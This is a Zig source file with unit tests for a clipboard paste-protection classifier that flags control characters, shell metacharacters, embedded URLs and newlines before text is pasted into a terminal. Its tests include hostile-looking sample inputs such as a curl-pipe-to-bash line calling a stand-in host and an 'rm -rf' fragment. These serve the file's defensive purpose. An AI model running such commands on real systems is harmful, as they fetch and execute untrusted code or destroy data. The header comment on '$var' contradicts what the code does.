//! Clipboard paste-protection severity classifier.
//!
//! Pure byte-inspection module: takes a payload, returns a `Verdict` with the
//! highest-severity reason found. No Win32 calls, no allocation, no side
//! effects.
//!
//! ## Severity ladder (highest wins)
//!
//!  1. `control_chars`   — C0 bytes (except `\t`, `\r`, `\n`) or DEL.
//!  2. `shell_metachar`  — unescaped `;`, `|`, `&`, `` ` ``, `$()`, `${}`,
//!                         `>`, `<`.
//!  3. `mixed_content`   — a URL scheme embedded inside surrounding text.
//!  4. `contains_newline`— `\n` or `\r` present.
//!  5. `safe`            — nothing suspicious.
//!
//! ## False-positive avoidance
//!
//! Characters deliberately NOT flagged by `hasShellMetachar`:
//!   - `*` / `?`  — glob wildcards; extremely common in legitimate pastes.
//!   - `"` / `'`  — quoting characters; flagging these catches every
//!                   shell command, producing unacceptable noise.
//!   - `$var`     — bare dollar-sign without `(` or `{` is just a variable
//!                   reference, not command substitution.
//!   - `&amp;`    — HTML entity, not a metachar.
//!   - spaces     — ubiquitous.
//!
//! The `hasMixedContent` heuristic counts non-whitespace bytes that fall
//! outside URL spans. When at least 6 such bytes exist the text is
//! considered mixed — enough to catch "click http://... right?" and
//! "curl http://... | bash" while letting a paste of one or more bare
//! URLs through. Schemes checked: `http://`, `https://`, `ftp://`,
//! `file://`. We omit `mailto:` and `ssh://` because they almost never
//! appear in injection payloads and would over-trigger on address pastes.

const std = @import("std");

// ---------------------------------------------------------------------------
// Severity + Verdict
// ---------------------------------------------------------------------------

pub const Severity = enum {
    safe,
    contains_newline,
    shell_metachar,
    control_chars,
    mixed_content,
};

pub const Verdict = struct {
    severity: Severity,
    /// Human-readable reason for the confirm overlay body.
    /// Borrowed from static strings — no allocation.
    reason: []const u8,
};

// ---------------------------------------------------------------------------
// Top-level inspector
// ---------------------------------------------------------------------------

/// Inspect `text` and return the highest-severity verdict.
///
/// Priority order: control_chars > shell_metachar > mixed_content >
/// contains_newline > safe.
pub fn inspect(text: []const u8) Verdict {
    if (hasControlChars(text)) return .{
        .severity = .control_chars,
        .reason = "Pasted text contains invisible control characters that could alter terminal behaviour.",
    };
    if (hasShellMetachar(text)) return .{
        .severity = .shell_metachar,
        .reason = "Pasted text contains shell metacharacters that could execute unintended commands.",
    };
    if (hasMixedContent(text)) return .{
        .severity = .mixed_content,
        .reason = "Pasted text contains a URL embedded in other content, which may be a social-engineering lure.",
    };
    if (hasNewline(text)) return .{
        .severity = .contains_newline,
        .reason = "Pasted text spans multiple lines, which may execute commands line-by-line in an interactive shell.",
    };
    return .{ .severity = .safe, .reason = "" };
}

// ---------------------------------------------------------------------------
// Detection predicates
// ---------------------------------------------------------------------------

/// True when any byte is a C0 control character (< 0x20) other than
/// `\t` (0x09), `\n` (0x0A), `\r` (0x0D), or is DEL (0x7F).
pub fn hasControlChars(text: []const u8) bool {
    for (text) |c| {
        if (c == 0x7F) return true;
        if (c < 0x20 and c != '\t' and c != '\n' and c != '\r') return true;
    }
    return false;
}

/// True when text contains at least one `\n` or `\r`.
pub fn hasNewline(text: []const u8) bool {
    for (text) |c| {
        if (c == '\n' or c == '\r') return true;
    }
    return false;
}

/// True when text contains an unescaped shell metacharacter that would
/// change command semantics in bash/zsh, PowerShell, or cmd.
///
/// Flagged: `;` `|` `&` `` ` `` `$(` `${` bare `$<alpha>` (PowerShell
/// variable expansion inside double quotes), `%VAR%` (cmd.exe env-var
/// expansion inside double quotes), `>` `<`.
/// NOT flagged: `*` `?` `"` `'` spaces.
///
/// The bare-`$` + `%VAR%` checks are specifically for the drag-drop
/// path where a filename might legitimately contain those characters
/// but cmd/PowerShell would still interpolate them inside the
/// double-quoted paste. Double-quoting alone doesn't prevent
/// interpolation in either shell.
pub fn hasShellMetachar(text: []const u8) bool {
    var i: usize = 0;
    while (i < text.len) : (i += 1) {
        const c = text[i];
        switch (c) {
            ';', '|', '&', '`', '>', '<' => return true,
            '$' => {
                // `$(...)`, `${...}` — explicit subshell / brace
                // expansion. Always unsafe.
                if (i + 1 < text.len and (text[i + 1] == '(' or text[i + 1] == '{')) return true;
                // `$name` — PowerShell variable expansion. Requires an
                // ASCII alpha or `_` after the `$` to qualify as an
                // identifier; a bare `$` followed by whitespace /
                // punctuation is harmless (literal `$`).
                if (i + 1 < text.len) {
                    const n = text[i + 1];
                    if ((n >= 'A' and n <= 'Z') or
                        (n >= 'a' and n <= 'z') or
                        n == '_')
                    {
                        return true;
                    }
                }
            },
            '%' => {
                // `%VAR%` — cmd.exe env-var expansion. Look for a
                // closing `%` within a reasonable identifier window
                // (letters, digits, underscore). Bare `%` with no
                // matching close is harmless literal.
                var j = i + 1;
                const limit = @min(text.len, i + 128);
                while (j < limit) : (j += 1) {
                    const m = text[j];
                    if (m == '%') {
                        if (j > i + 1) return true; // non-empty %NAME%
                        break;
                    }
                    const is_id = (m >= 'A' and m <= 'Z') or
                        (m >= 'a' and m <= 'z') or
                        (m >= '0' and m <= '9') or
                        m == '_';
                    if (!is_id) break;
                }
            },
            else => {},
        }
    }
    return false;
}

/// True when text contains a URL scheme embedded in surrounding material.
///
/// Strategy: find every URL span in the text, sum their lengths, then
/// check whether the remaining (non-URL) bytes contain enough
/// non-whitespace content to constitute "surrounding material." The
/// threshold is 6 non-whitespace non-URL bytes — enough to catch
/// "click http://... right?" or "curl http://... | bash" while
/// letting a paste of one or more bare URLs through.
pub fn hasMixedContent(text: []const u8) bool {
    const schemes = [_][]const u8{
        "http://",
        "https://",
        "ftp://",
        "file://",
    };

    // Collect URL spans: each bit indicates whether a byte is part of a URL.
    // Avoid allocation by iterating twice: first to sum URL bytes, then to
    // count non-URL non-whitespace.
    var url_bytes: usize = 0;
    var found_any = false;

    for (schemes) |scheme| {
        var pos: usize = 0;
        while (pos <= text.len -| scheme.len) {
            if (findSchemeAt(text, scheme, pos)) |start| {
                found_any = true;
                const ulen = urlLength(text, start);
                url_bytes += ulen;
                pos = start + ulen;
            } else {
                break;
            }
        }
    }

    if (!found_any) return false;

    // Count non-whitespace bytes outside URL spans. We approximate by
    // subtracting url_bytes from text.len and counting non-ws in the
    // remainder. Because URL spans can overlap with schemes found by
    // different patterns, this is conservative (may under-count
    // non-URL content), which biases toward fewer false positives.
    const remainder = text.len -| url_bytes;
    if (remainder < 6) return false;

    // Verify the remainder actually has non-whitespace substance.
    var non_ws: usize = 0;
    var i: usize = 0;
    while (i < text.len) : (i += 1) {
        // Skip URL spans.
        var in_url = false;
        for (schemes) |scheme| {
            if (i + scheme.len <= text.len and std.mem.eql(u8, text[i..][0..scheme.len], scheme)) {
                const ulen = urlLength(text, i);
                i += ulen -| 1; // -1 because loop increments
                in_url = true;
                break;
            }
        }
        if (in_url) continue;
        const c = text[i];
        if (c != ' ' and c != '\t' and c != '\n' and c != '\r') {
            non_ws += 1;
        }
    }

    return non_ws >= 6;
}

/// Return the byte offset of the first occurrence of `scheme` in `text`
/// at or after `from`, or null.
fn findSchemeAt(text: []const u8, scheme: []const u8, from: usize) ?usize {
    if (text.len < scheme.len) return null;
    var i: usize = from;
    while (i <= text.len - scheme.len) : (i += 1) {
        if (std.mem.eql(u8, text[i..][0..scheme.len], scheme)) return i;
    }
    return null;
}

/// Measure the length of a URL starting at `start` in `text`.
/// A URL extends until the first whitespace byte or end-of-text.
fn urlLength(text: []const u8, start: usize) usize {
    var end = start;
    while (end < text.len and text[end] != ' ' and text[end] != '\t' and
        text[end] != '\n' and text[end] != '\r') : (end += 1)
    {}
    return end - start;
}

// ===========================================================================
// Tests
// ===========================================================================

test "hasControlChars" {
    const testing = std.testing;

    try testing.expect(!hasControlChars(""));
    try testing.expect(!hasControlChars("hello"));
    try testing.expect(!hasControlChars("hello\tworld"));
    try testing.expect(!hasControlChars("hello\nworld"));
    try testing.expect(hasControlChars("hello\x07world")); // BEL
    try testing.expect(hasControlChars("hello\x7Fworld")); // DEL
}

test "hasNewline" {
    const testing = std.testing;

    try testing.expect(!hasNewline(""));
    try testing.expect(!hasNewline("single line"));
    try testing.expect(hasNewline("line1\nline2"));
    try testing.expect(hasNewline("carriage\rreturn"));
}

test "hasShellMetachar" {
    const testing = std.testing;

    try testing.expect(!hasShellMetachar("echo hello"));
    try testing.expect(hasShellMetachar("echo hi;ls")); // ;
    try testing.expect(hasShellMetachar("cat foo | grep")); // |
    try testing.expect(hasShellMetachar("sleep 1 & echo")); // &
    try testing.expect(hasShellMetachar("echo `date`")); // backtick
    try testing.expect(hasShellMetachar("echo $(date)")); // $(
    try testing.expect(hasShellMetachar("echo ${var}")); // ${
    try testing.expect(hasShellMetachar("echo > out")); // >
    try testing.expect(hasShellMetachar("echo < in")); // <
    try testing.expect(!hasShellMetachar("multiple * files")); // glob not flagged
    try testing.expect(!hasShellMetachar("echo 'with space'")); // quotes not flagged
    try testing.expect(!hasShellMetachar("cost $5 today")); // $ + digit not flagged

    // Drag-drop regressions: PowerShell + cmd variable expansion
    // fire inside double-quoted paste payloads. Filename drops that
    // contain these should trigger the confirmation prompt.
    try testing.expect(hasShellMetachar("$HOME.txt")); // PowerShell $name
    try testing.expect(hasShellMetachar("$_private")); // leading underscore
    try testing.expect(hasShellMetachar("foo$USER"));
    try testing.expect(hasShellMetachar("%USERPROFILE%.txt")); // cmd %VAR%
    try testing.expect(hasShellMetachar("C:\\tmp\\%TEMP%\\x"));

    // Harmless bare `%` without an identifier window should NOT trigger.
    try testing.expect(!hasShellMetachar("50% discount"));
    try testing.expect(!hasShellMetachar("foo%"));
}

test "hasMixedContent" {
    const testing = std.testing;

    try testing.expect(!hasMixedContent("https://example.com"));
    try testing.expect(!hasMixedContent("https://example.com/path"));
    try testing.expect(hasMixedContent("click http://example.com right?"));
    try testing.expect(!hasMixedContent("no url here"));
    try testing.expect(hasMixedContent("curl http://bad.sh | bash"));
}

test "inspect severity ranking" {
    const testing = std.testing;

    try testing.expectEqual(Severity.safe, inspect("").severity);
    try testing.expectEqual(Severity.safe, inspect("harmless").severity);
    try testing.expectEqual(Severity.contains_newline, inspect("line1\nline2").severity);
    try testing.expectEqual(Severity.shell_metachar, inspect("line1\nline2;rm -rf").severity);
    try testing.expectEqual(Severity.control_chars, inspect("line1\x07beep").severity);
    try testing.expectEqual(Severity.mixed_content, inspect("visit http://x right now").severity);
    try testing.expectEqual(Severity.contains_newline, inspect("http://x\nhttp://y").severity);
}
